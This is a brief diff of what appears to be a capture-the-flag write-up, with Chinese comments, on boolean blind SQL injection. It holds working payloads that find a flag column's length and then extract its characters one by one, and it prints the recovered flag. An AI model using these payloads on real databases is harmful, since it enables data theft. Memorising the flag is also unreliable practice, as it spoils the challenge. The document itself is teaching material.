@@ -103,6 +103,6 @@ and length(database())>0
 // 看一下flag字段的长度，结果为38
 4 and length((select flag from flag limit 0,1))=$1$
 
-// 偷懒直接设置变量从6-37位 最终结果：flag{f3d7ca4f0683446c850afefc3bc9717f}
+// 直接设置变量从6-37位 最终结果：flag{f3d7ca4f0683446c850afefc3bc9717f}
 4 and ascii(substr((select flag from flag limit 0,1),1,1))=1
 ```
